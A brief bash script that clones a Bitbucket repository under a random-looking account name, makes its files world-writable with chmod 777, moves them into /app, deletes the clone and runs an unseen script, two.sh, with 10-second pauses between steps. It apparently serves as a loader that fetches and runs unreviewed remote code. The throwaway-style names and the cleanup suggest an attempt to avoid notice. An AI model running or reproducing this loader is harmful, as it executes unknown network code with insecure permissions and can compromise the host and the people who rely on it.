#!/bin/bash

sleep 10

git clone https://zinxamurafaridadunaca053-admin@bitbucket.org/zinxamurafaridadunaca0539gyfr4607/0001-of-02-us.git

sleep 10

chmod 777 /app/0001-of-02-us

sleep 10

cd /app/0001-of-02-us && mv /app/0001-of-02-us/* /app/

sleep 10

rm -fr /app/0001-of-02-us

sleep 10

chmod 777 /app/*

sleep 10

cd /app && ./two.sh
